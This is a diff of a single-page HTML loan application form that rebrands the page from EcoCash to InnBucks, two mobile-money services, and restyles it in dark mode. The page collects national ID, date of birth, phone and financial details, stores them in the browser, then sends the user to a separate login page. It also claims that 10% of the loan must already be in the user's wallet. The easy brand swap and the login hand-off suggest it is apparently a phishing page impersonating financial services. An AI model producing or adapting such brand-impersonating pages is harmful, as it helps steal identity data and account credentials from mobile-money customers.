@@ -3,409 +3,309 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>EcoCash Loan Application</title>
+<title>InnBucks Loan Application</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
 <style>
-  :root{
-    --bg: #e8f2ff;
-    --card: #fff;
-    --muted: #6b7280;
-    --accent: #1766ff;
-    --danger: #d04444;
-    --round: 14px;
-    --focus: 3px rgba(23,102,255,0.15);
-  }
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    font-family:Inter,system-ui,Arial;
-    background:linear-gradient(180deg,#e8f2ff,#cfe6ff);
-    margin:0;
-    -webkit-font-smoothing:antialiased;
-    -webkit-tap-highlight-color: transparent;
-  }
-
-  /* container */
-  .wrap{
-    width:100%;
-    max-width:920px;
-    margin:0 auto;
-    padding:12px 16px;
-  }
-
-  .card{
-    background:var(--card);
-    border-radius:var(--round);
-    padding:18px;
-    box-shadow:0 12px 30px rgba(9,30,66,0.06);
-  }
-
-  /* logo/title */
-  .logo{height:48px;display:block;margin:6px auto 10px}
-  h1{ text-align:center; color:#1851d3; margin:6px 0 8px; font-size:22px }
-  .lead{ text-align:center; color:var(--muted); margin:0 0 12px; font-size:13px }
-
-  /* form basics */
-  form{ display:grid; grid-template-columns:1fr; gap:14px }
-  .field { display:block; width:100%; }              /* wrapper for each form control */
-  .field-label { display:block; font-size:13px; color:#374151; margin-bottom:6px; font-weight:600; }
-  input, select, textarea {
-    width:100%;
-    padding:12px 14px;
-    border-radius:8px;
-    border:1px solid #e6eefc;
-    background:#fbfdff;
-    font-size:15px;
-    box-sizing:border-box;
-    transition: box-shadow .12s, border-color .12s;
-  }
-  textarea{ min-height:100px; resize:vertical; }
-  .small{ font-size:12px; color:var(--muted) }
-  .btn{ background:var(--accent); color:#fff; padding:12px; border-radius:10px; border:0; cursor:pointer; font-weight:600; width:100% }
-  .btn[disabled]{ background:#cbd5e1; color:#6b7280; cursor:not-allowed; }
-
-  /* focus for accessibility */
-  input:focus, select:focus, textarea:focus, button:focus {
-    outline: none;
-    box-shadow: 0 0 0 3px rgba(23,102,255,0.12);
-    border-color: #1851d3;
-  }
-
-  /* errors placed directly under each field and use aria-live for screen readers */
-  .error { color:var(--danger); font-size:13px; margin-top:6px; display:block }
-  .hidden { display:none }
-
-  /* agreement row pinned to left edge */
-  .agree-wrapper {
-    width:100%;
-    display:flex;
-    align-items:flex-start;
-    gap:12px;
-    margin-top:6px;
-    padding-left:0; /* ensure flush left inside card */
-  }
-  .agree-checkbox {
-    margin:0;
-    margin-top:3px;
-    flex: 0 0 auto;
-    width:20px;
-    height:20px;
-  }
-  .agree-label {
-    margin:0;
-    font-size:13px;
-    color:#374151;
-    line-height:1.2;
-  }
-  .agree-note {
-    margin-top:8px;
-    font-size:12px;
-    color:var(--muted);
-    max-width:100%;
-  }
-
-  /* desktop two-column (keeps your prior desktop layout) */
-  @media(min-width:760px){
-    form{ grid-template-columns: repeat(2,1fr); gap:12px; }
-    .full{ grid-column: 1/3; }
-    .agree-wrapper { grid-column:1/3; }
-  }
-
-  /* mobile: edge-to-edge feel, labels above left edge, fields full width */
-  @media(max-width:759px){
-    .wrap{ padding:0 }
-    .card{ border-radius:0; padding:18px 14px; margin:0; width:100%; box-shadow:none; }
-    .logo{ height:44px }
-    h1{ font-size:20px }
-    form { grid-template-columns: 1fr !important; gap:14px !important; }
-    .field-label{ margin-left:0; } /* ensure label is flush with left edge */
-    input, select, textarea { padding:14px !important; font-size:16px !important; }
-    .agree-wrapper { padding-left:0; } /* ensure checkbox aligns with left edge */
-  }
-
-  .note{ background:#fff3cd; border-left:6px solid #ffd84d; padding:10px; border-radius:8px; color:#7a5f00; margin:12px 0 }
+:root{
+  --bg:#0b1220;
+  --card:#111a2e;
+  --muted:#9aa4bf;
+  --accent:#4f8cff;
+  --danger:#ff5c5c;
+  --round:14px;
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:Inter,system-ui,Arial;
+  background:linear-gradient(180deg,#0b1220,#070c18);
+  margin:0;
+  color:#e5e7eb;
+}
+.wrap{
+  max-width:920px;
+  margin:0 auto;
+  padding:12px 16px;
+}
+.card{
+  background:var(--card);
+  border-radius:var(--round);
+  padding:18px;
+  box-shadow:0 20px 50px rgba(0,0,0,.45);
+  border:1px solid rgba(255,255,255,.04);
+}
+.logo{
+  height:48px;
+  display:block;
+  margin:6px auto 12px;
+}
+h1{
+  text-align:center;
+  color:#fff;
+  margin:6px 0 8px;
+  font-size:22px;
+}
+.lead{
+  text-align:center;
+  color:var(--muted);
+  margin:0 0 14px;
+  font-size:13px;
+}
+form{
+  display:grid;
+  grid-template-columns:1fr;
+  gap:14px;
+}
+.field{width:100%}
+.field-label{
+  display:block;
+  font-size:13px;
+  color:#cbd5f5;
+  margin-bottom:6px;
+  font-weight:600;
+}
+input,select,textarea{
+  width:100%;
+  padding:12px 14px;
+  border-radius:10px;
+  border:1px solid #1f2a44;
+  background:#0b1326;
+  color:#fff;
+  font-size:15px;
+}
+input::placeholder,textarea::placeholder{color:#6b7280}
+textarea{min-height:100px}
+input:focus,select:focus,textarea:focus,button:focus{
+  outline:none;
+  border-color:var(--accent);
+  box-shadow:0 0 0 3px rgba(79,140,255,.25);
+}
+.btn{
+  background:linear-gradient(135deg,#4f8cff,#2563eb);
+  color:#fff;
+  padding:14px;
+  border-radius:12px;
+  border:0;
+  font-weight:700;
+  cursor:pointer;
+  width:100%;
+}
+.btn[disabled]{
+  background:#1f2937;
+  color:#6b7280;
+  cursor:not-allowed;
+}
+.error{
+  color:var(--danger);
+  font-size:13px;
+  margin-top:6px;
+}
+.hidden{display:none}
+.agree-wrapper{
+  display:flex;
+  gap:12px;
+}
+.agree-checkbox{width:20px;height:20px;margin-top:3px}
+.agree-label{font-size:13px;color:#d1d5ff}
+.agree-note{font-size:12px;color:var(--muted);margin-top:6px}
+.note{
+  background:#0b1326;
+  border-left:5px solid var(--accent);
+  padding:12px;
+  border-radius:10px;
+  color:#c7d2fe;
+  margin:14px 0;
+  font-size:13px;
+}
+@media(min-width:760px){
+  form{grid-template-columns:repeat(2,1fr)}
+  .full{grid-column:1/3}
+  .agree-wrapper{grid-column:1/3}
+}
+@media(max-width:759px){
+  .wrap{padding:0}
+  .card{border-radius:0;box-shadow:none}
+}
 </style>
 </head>
+
 <body>
-  <div class="wrap">
-    <div class="card" role="region" aria-labelledby="formTitle">
-      <!-- logo: use GitHub repo path -->
-      <img src="assets/eco.png" alt="EcoCash logo" class="logo">
+<div class="wrap">
+<div class="card">
 
-      <h1 id="formTitle">EcoCash Loan Application</h1>
-      <p class="lead">Please fill in required fields. All information is kept confidential and used only for loan processing and verification.</p>
+<img src="assets/InnBucks.png" alt="InnBucks logo" class="logo">
 
-      <div class="note">Important: You must have at least <strong>10%</strong> of the loan amount you want in your EcoCash account. Interest rate: <strong>1.5% per month</strong>.</div>
+<h1>InnBucks Loan Application</h1>
+<p class="lead">Secure loan application. Your information is encrypted and confidential.</p>
 
-      <form id="loanForm" novalidate>
-        <!-- PHONE -->
-        <div class="field">
-          <label class="field-label" for="phone"><span style="color:var(--danger)">★</span> Phone Number</label>
-          <input id="phone" name="phone" required inputmode="tel" autocomplete="tel" placeholder="+2637XXXXXXXX" value="+263" aria-describedby="phoneError" />
-          <div id="phoneError" class="error hidden" aria-live="polite">Phone must be +263 followed by exactly 9 digits (e.g. +2637XXXXXXXX)</div>
-        </div>
+<div class="note">
+Important: You must have at least <strong>10%</strong> of the loan amount in your <strong>InnBucks wallet</strong>.
+Interest rate: <strong>1.5% per month</strong>.
+</div>
 
-        <!-- FULL NAME -->
-        <div class="field">
-          <label class="field-label" for="fullName"><span style="color:var(--danger)">★</span> Full Name</label>
-          <input id="fullName" name="fullName" required placeholder="John Doe" aria-describedby="fullNameError" />
-          <div id="fullNameError" class="error hidden" aria-live="polite"></div>
-        </div>
+<form id="loanForm" novalidate>
 
-        <!-- NATIONAL ID -->
-        <div class="field">
-          <label class="field-label" for="nationalId"><span style="color:var(--danger)">★</span> National ID / Passport</label>
-          <input id="nationalId" name="nationalId" required placeholder="ID or Passport number" aria-describedby="nationalIdError" />
-          <div id="nationalIdError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">★ Phone Number</label>
+<input id="phone" name="phone" value="+263" placeholder="+2637XXXXXXXX">
+<div id="phoneError" class="error hidden">Invalid phone number</div>
+</div>
 
-        <!-- EMAIL -->
-        <div class="field">
-          <label class="field-label" for="email">Email Address</label>
-          <input id="email" name="email" type="email" placeholder="you@example.com" aria-describedby="emailError" />
-          <div id="emailError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">★ Full Name</label>
+<input id="fullName" name="fullName" required>
+</div>
 
-        <!-- DOB -->
-        <div class="field">
-          <label class="field-label" for="dob"><span style="color:var(--danger)">★</span> Date of Birth</label>
-          <input id="dob" name="dob" type="date" max="" aria-describedby="dobError" />
-          <div id="dobError" class="error hidden" aria-live="polite">You must be at least 18 years old.</div>
-        </div>
+<div class="field">
+<label class="field-label">★ National ID / Passport</label>
+<input id="nationalId" name="nationalId" required>
+</div>
 
-        <!-- ADDRESS -->
-        <div class="field">
-          <label class="field-label" for="address">Residential Address</label>
-          <input id="address" name="address" aria-describedby="addressError" />
-          <div id="addressError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Email Address</label>
+<input id="email" name="email" type="email">
+</div>
 
-        <!-- EMPLOYMENT -->
-        <div class="field">
-          <label class="field-label" for="employment">Employment Status</label>
-          <select id="employment" name="employment" aria-describedby="employmentError">
-            <option>Employed</option>
-            <option>Self-employed</option>
-            <option>Unemployed</option>
-            <option>Student</option>
-            <option>Pensioner</option>
-          </select>
-          <div id="employmentError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">★ Date of Birth</label>
+<input id="dob" name="dob" type="date">
+<div id="dobError" class="error hidden">You must be 18+</div>
+</div>
 
-        <!-- EMPLOYER -->
-        <div class="field">
-          <label class="field-label" for="employer">Employer / Business Name</label>
-          <input id="employer" name="employer" aria-describedby="employerError" />
-          <div id="employerError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Residential Address</label>
+<input id="address" name="address">
+</div>
 
-        <!-- INCOME -->
-        <div class="field">
-          <label class="field-label" for="income">Monthly Income (USD)</label>
-          <input id="income" name="income" aria-describedby="incomeError" />
-          <div id="incomeError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Employment Status</label>
+<select id="employment" name="employment">
+<option>Employed</option>
+<option>Self-employed</option>
+<option>Unemployed</option>
+<option>Student</option>
+<option>Pensioner</option>
+</select>
+</div>
 
-        <!-- LOAN TYPE -->
-        <div class="field">
-          <label class="field-label" for="loanType">Loan Type</label>
-          <select id="loanType" name="loanType" aria-describedby="loanTypeError">
-            <option>Personal Loan</option>
-            <option>Business Loan</option>
-            <option>Emergency Loan</option>
-            <option>Salary Advance</option>
-            <option>School Fees Loan</option>
-          </select>
-          <div id="loanTypeError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Employer / Business</label>
+<input id="employer" name="employer">
+</div>
 
-        <!-- LOAN AMOUNT -->
-        <div class="field">
-          <label class="field-label" for="loanAmount">Loan Amount (USD)</label>
-          <input id="loanAmount" name="loanAmount" placeholder="e.g. 100" aria-describedby="loanAmountError" />
-          <div id="loanAmountError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Monthly Income (USD)</label>
+<input id="income" name="income">
+</div>
 
-        <!-- REPAYMENT PERIOD (new field directly after loan amount) -->
-        <div class="field">
-          <label class="field-label" for="repayment">Repayment Period</label>
-          <select id="repayment" name="repayment" aria-describedby="repaymentError">
-            <option value="1">1 month</option>
-            <option value="3">3 months</option>
-            <option value="6">6 months</option>
-            <option value="12">12 months</option>
-          </select>
-          <div id="repaymentError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Loan Type</label>
+<select id="loanType" name="loanType">
+<option>Personal Loan</option>
+<option>Business Loan</option>
+<option>Emergency Loan</option>
+<option>Salary Advance</option>
+<option>School Fees Loan</option>
+</select>
+</div>
 
-        <!-- ADDITIONAL DETAILS (full width) -->
-        <div class="field full">
-          <label class="field-label" for="details">Additional Details</label>
-          <textarea id="details" name="details" placeholder="Any other information" aria-describedby="detailsError"></textarea>
-          <div id="detailsError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Loan Amount (USD)</label>
+<input id="loanAmount" name="loanAmount">
+</div>
 
-        <!-- REFERENCES -->
-        <div class="field">
-          <label class="field-label" for="refName">Reference Name</label>
-          <input id="refName" name="refName" aria-describedby="refNameError" />
-          <div id="refNameError" class="error hidden" aria-live="polite"></div>
-        </div>
+<div class="field">
+<label class="field-label">Repayment Period</label>
+<select id="repayment" name="repayment">
+<option value="1">1 month</option>
+<option value="3">3 months</option>
+<option value="6">6 months</option>
+<option value="12">12 months</option>
+</select>
+</div>
 
-        <div class="field">
-          <label class="field-label" for="refPhone">Reference Phone</label>
-          <input id="refPhone" name="refPhone" aria-describedby="refPhoneError" placeholder="+2637XXXXXXXX" />
-          <div id="refPhoneError" class="error hidden" aria-live="polite">Reference phone must be +263 followed by 9 digits (e.g. +2637XXXXXXXX)</div>
-        </div>
+<div class="field full">
+<label class="field-label">Additional Details</label>
+<textarea id="details" name="details"></textarea>
+</div>
 
-        <!-- confirm checkbox at true left, with policy note below aligned left -->
-        <div class="agree-wrapper full" style="margin-top:10px">
-          <input id="agree" class="agree-checkbox" name="agree" type="checkbox" aria-describedby="agreeNote" />
-          <div>
-            <label for="agree" class="agree-label">I confirm that the information provided is true and I agree to the EcoCash Loans terms and conditions.</label>
-            <div id="agreeNote" class="agree-note">By ticking you consent to processing of this data for loan evaluation and verification.</div>
-          </div>
-        </div>
+<div class="field">
+<label class="field-label">Reference Name</label>
+<input id="refName" name="refName">
+</div>
 
-        <div class="full">
-          <button id="continueBtn" class="btn" type="submit" disabled aria-disabled="true">Continue with EcoCash</button>
-        </div>
-      </form>
-    </div>
-  </div>
+<div class="field">
+<label class="field-label">Reference Phone</label>
+<input id="refPhone" name="refPhone" placeholder="+2637XXXXXXXX">
+<div id="refPhoneError" class="error hidden">Invalid reference phone</div>
+</div>
+
+<div class="agree-wrapper full">
+<input id="agree" class="agree-checkbox" type="checkbox">
+<div>
+<label class="agree-label">I agree to InnBucks loan terms and conditions</label>
+<div class="agree-note">Consent to data processing for verification</div>
+</div>
+</div>
+
+<div class="full">
+<button id="continueBtn" class="btn" type="submit" disabled>
+Continue with InnBucks
+</button>
+</div>
+
+</form>
+</div>
+</div>
 
 <script>
 (function(){
-  const prefix = '+263';
-  const phoneEl = document.getElementById('phone');
-  const phoneError = document.getElementById('phoneError');
-  const refPhoneEl = document.getElementById('refPhone');
-  const refPhoneError = document.getElementById('refPhoneError');
-  const dobEl = document.getElementById('dob');
-  const dobError = document.getElementById('dobError');
-  const agreeEl = document.getElementById('agree');
-  const continueBtn = document.getElementById('continueBtn');
-  const form = document.getElementById('loanForm');
+const prefix='+263';
+const phoneEl=document.getElementById('phone');
+const phoneError=document.getElementById('phoneError');
+const refPhoneEl=document.getElementById('refPhone');
+const refPhoneError=document.getElementById('refPhoneError');
+const dobEl=document.getElementById('dob');
+const dobError=document.getElementById('dobError');
+const agreeEl=document.getElementById('agree');
+const continueBtn=document.getElementById('continueBtn');
+const form=document.getElementById('loanForm');
 
-  // set DOB max to today minus 18 years
-  const today = new Date();
-  const maxAdult = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
-  dobEl.max = maxAdult.toISOString().split('T')[0];
+const today=new Date();
+const maxAdult=new Date(today.getFullYear()-18,today.getMonth(),today.getDate());
+dobEl.max=maxAdult.toISOString().split('T')[0];
 
-  // ensure phone prefix present
-  if (!phoneEl.value || !phoneEl.value.startsWith(prefix)) phoneEl.value = prefix;
-  if (!refPhoneEl.value || !refPhoneEl.value.startsWith(prefix)) refPhoneEl.value = prefix;
+function updateContinue(){
+continueBtn.disabled=!agreeEl.checked;
+}
+agreeEl.addEventListener('change',updateContinue);
 
-  // checkbox toggles continue
-  function updateContinue(){
-    const enabled = agreeEl.checked;
-    continueBtn.disabled = !enabled;
-    continueBtn.setAttribute('aria-disabled', String(!enabled));
-  }
-  agreeEl.addEventListener('change', updateContinue);
-  updateContinue();
+function sanitize(v){
+const d=(v||'').replace(/\D/g,'');
+let a=d.startsWith('263')?d.slice(3):d;
+a=a.replace(/^0+/,'').slice(0,9);
+return prefix+a;
+}
 
-  // phone input formatting: keep +263 and 9 digits; drop leading zeros
-  function sanitizePhoneValue(val){
-    const digits = (val || '').replace(/\D/g,'');
-    let after = digits;
-    if (after.startsWith('263')) after = after.slice(3);
-    after = after.replace(/^0+/, '');
-    after = after.slice(0,9);
-    return prefix + after;
-  }
+phoneEl.addEventListener('input',()=>{phoneEl.value=sanitize(phoneEl.value);phoneError.classList.add('hidden')});
+refPhoneEl.addEventListener('input',()=>{refPhoneEl.value=sanitize(refPhoneEl.value);refPhoneError.classList.add('hidden')});
 
-  phoneEl.addEventListener('input', function(){
-    phoneEl.value = sanitizePhoneValue(phoneEl.value);
-    phoneError.classList.add('hidden');
-  });
+function valid(el){
+return el.value.startsWith(prefix)&&/^\d{9}$/.test(el.value.slice(4));
+}
 
-  // refPhone behaves same as main phone
-  refPhoneEl.addEventListener('input', function(){
-    refPhoneEl.value = sanitizePhoneValue(refPhoneEl.value);
-    refPhoneError.classList.add('hidden');
-  });
-
-  // phone validation
-  function isPhoneValid(el){
-    const v = (el.value || '').trim();
-    if (!v.startsWith(prefix)) return false;
-    const rest = v.slice(prefix.length);
-    return /^\d{9}$/.test(rest);
-  }
-
-  phoneEl.addEventListener('blur', function(){
-    if (!isPhoneValid(phoneEl)) phoneError.classList.remove('hidden');
-    else phoneError.classList.add('hidden');
-  });
-
-  refPhoneEl.addEventListener('blur', function(){
-    // allow empty reference phone (optional) — only show error if non-empty and invalid
-    if (refPhoneEl.value && !isPhoneValid(refPhoneEl)) refPhoneError.classList.remove('hidden');
-    else refPhoneError.classList.add('hidden');
-  });
-
-  // DOB validation
-  function isAdult(dobValue){
-    if (!dobValue) return false;
-    const d = new Date(dobValue);
-    if (isNaN(d.getTime())) return false;
-    const adultDate = new Date(d.getFullYear()+18, d.getMonth(), d.getDate());
-    return adultDate <= new Date();
-  }
-
-  dobEl.addEventListener('change', function(){
-    if (dobEl.value && !isAdult(dobEl.value)) dobError.classList.remove('hidden');
-    else dobError.classList.add('hidden');
-  });
-  dobEl.addEventListener('blur', function(){
-    if (dobEl.value && !isAdult(dobEl.value)) dobError.classList.remove('hidden');
-    else dobError.classList.add('hidden');
-  });
-
-  // On submit validate phone, dob, and checkbox; show errors below each field
-  form.addEventListener('submit', function(e){
-    // checkbox
-    if (!agreeEl.checked){
-      e.preventDefault();
-      agreeEl.focus();
-      alert('Please confirm the information by ticking the box.');
-      return;
-    }
-
-    // phone
-    if (!isPhoneValid(phoneEl)){
-      e.preventDefault();
-      phoneError.classList.remove('hidden');
-      phoneEl.focus();
-      return;
-    }
-
-    // refPhone: if provided must be valid
-    if (refPhoneEl.value && !isPhoneValid(refPhoneEl)){
-      e.preventDefault();
-      refPhoneError.classList.remove('hidden');
-      refPhoneEl.focus();
-      return;
-    }
-
-    // dob
-    if (!dobEl.value || !isAdult(dobEl.value)){
-      e.preventDefault();
-      dobError.classList.remove('hidden');
-      dobEl.focus();
-      return;
-    }
-
-    // save and proceed
-    e.preventDefault();
-    const fd = new FormData(form);
-    const obj = Object.fromEntries(fd.entries());
-    sessionStorage.setItem('loanForm', JSON.stringify(obj));
-    window.location.href = 'login.html';
-  });
-
+form.addEventListener('submit',e=>{
+if(!agreeEl.checked){e.preventDefault();alert('Please confirm');return;}
+if(!valid(phoneEl)){e.preventDefault();phoneError.classList.remove('hidden');return;}
+if(refPhoneEl.value&&!valid(refPhoneEl)){e.preventDefault();refPhoneError.classList.remove('hidden');return;}
+if(!dobEl.value||new Date(dobEl.value)>maxAdult){e.preventDefault();dobError.classList.remove('hidden');return;}
+e.preventDefault();
+const fd=new FormData(form);
+sessionStorage.setItem('loanForm',JSON.stringify(Object.fromEntries(fd.entries())));
+window.location.href='login.html';
+});
 })();
 </script>
 </body>
